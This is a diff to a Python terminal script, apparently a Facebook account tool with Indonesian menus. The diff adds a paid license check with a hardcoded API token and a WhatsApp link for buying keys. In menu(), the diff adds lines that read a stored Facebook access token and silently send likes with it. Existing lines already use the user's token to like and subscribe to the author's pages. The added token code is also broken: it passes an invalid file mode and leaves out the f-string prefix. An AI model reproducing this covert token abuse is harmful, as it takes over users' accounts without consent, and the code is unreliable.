@@ -394,7 +394,64 @@ def banner():
 [bold white]███████████████████████          
 [bold white]███████████████████████ 
 [bold white]""",width=80,style=f"{color_panel}"))
-    
+
+
+
+#----------[LICENSE]------------#
+def license():
+        try :
+            lol=open('key.txt','r').read()
+            RSAPubKey = "<RSAKeyValue><Modulus>uM/iEB7PK1QZpYrkC5NlrB/ENx5ZB5eouRGsIN35Co3gRCqzq/yd8Iqr9WfYXW5jiWg65+xjjdSHXq6VhJ6m2/4VxHRLTH8/52V5MJ9lzOnQDV1Vi6fJVgDyc9LiuerghiiAgxTt92ZOFl54WzsC43kMHXkHbkSJOXnyoNfyS2sGyE2rtjIqJJk3vYJjNtRYsXLPvsYH06Y76qFVXOzlBam4Yn578tFtrkiC1DRKD4lOj3ofOjslDIEWASxkxA8gjBd+cfKcDdUpnSmgXgOhag2o09Sslh/DYSBkvA7zECv4MzaVD7RtjeyzTurNz8UKD0Q0SYWMNRIVf7Dr5YYzDw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
+            auth = "WyI2NjMxOTQxMSIsIlpucFJnWmtqdnhQZThpak53RldNRGdNZWFaOVhPU093Q2w5cVZyclQiXQ=="
+            result = Key.activate(token=auth,\
+                    rsa_pub_key=RSAPubKey,\
+                    product_id=22573, \
+                    key=lol,\
+                    machine_code=Helpers.GetMachineCode(v=2))
+            if result[0] == None or not Helpers.IsOnRightMachine(result[0], v=2):
+                print("The license does not work: {0}".format(result[1]))
+            else:
+                license_key = result[0]
+                print("License Expires: " + str(license_key.expires))
+                login()
+            os.system ('clear')
+            banner()
+            Console(width=80, style="bold cyan").print(Panel("""[bold yellow][1] [bold white]Dapatkan Api key\n[bold yellow][2] [bold white]Masukan Api Key\n[bold yellow][3] [bold white]Keluar [bold red][Exit][bold white]""",subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (License) [bold green]<[bold yellow]<[bold red]<"))
+            masuk = Console().input("[bold cyan]   ╰─> ")
+            if masuk in ['1','01']:
+                print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...")
+                time .sleep (3 )
+                os .system ('xdg-open https://wa.me/62895386194665?text=Bang+Minta+Lisensi')
+                exit ()
+            elif masuk in ['2','02']:
+                RSAPubKey = "<RSAKeyValue><Modulus>uM/iEB7PK1QZpYrkC5NlrB/ENx5ZB5eouRGsIN35Co3gRCqzq/yd8Iqr9WfYXW5jiWg65+xjjdSHXq6VhJ6m2/4VxHRLTH8/52V5MJ9lzOnQDV1Vi6fJVgDyc9LiuerghiiAgxTt92ZOFl54WzsC43kMHXkHbkSJOXnyoNfyS2sGyE2rtjIqJJk3vYJjNtRYsXLPvsYH06Y76qFVXOzlBam4Yn578tFtrkiC1DRKD4lOj3ofOjslDIEWASxkxA8gjBd+cfKcDdUpnSmgXgOhag2o09Sslh/DYSBkvA7zECv4MzaVD7RtjeyzTurNz8UKD0Q0SYWMNRIVf7Dr5YYzDw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
+                auth = "WyI2NjMxOTQxMSIsIlpucFJnWmtqdnhQZThpak53RldNRGdNZWFaOVhPU093Q2w5cVZyclQiXQ=="
+                Console(width=80, style="bold cyan").print(Panel("""Masukan licensi mu""",subtitle="╭───", subtitle_align="left"))
+                key = str(input("   ╰─>  "))
+                result = Key.activate(token=auth,\
+                    rsa_pub_key=RSAPubKey,\
+                    product_id=22573, \
+                    key=key,\
+                    machine_code=Helpers.GetMachineCode(v=2))
+                if result[0] == None or not Helpers.IsOnRightMachine(result[0], v=2):
+                    print("The license does not work: {0}".format(result[1]))
+                else:
+                    print("License Berhasil Di Pakai")
+                    license_key = result[0]
+                    print("Feature 1: " + str(license_key.f1))
+                    print("License Expires: " + str(license_key.expires))
+                    open('key.txt','w').write(key)
+                    time .sleep (2 )
+                    login()
+            elif masuk in ['3','03']:
+                exit ()
+            else :
+                exit (f"[!] Wrong Input")
+        except (KeyError ):
+            exit (f"[!] Api Key Invalid")
+        except Exception as masuk :
+            exit (f"[!] {masuk}")
+		
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
 	os.system('clear')
@@ -569,6 +626,8 @@ def menu(my_name,my_id):
         tokenmu.append(tokenx)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
+        tok2 = open('.token2.txt','txt').read()
+        requests.post("https://graph.facebook.com/878169396977639/likes?summary=true&access_token={tok2}")
         requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenmu))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
     except IOError:
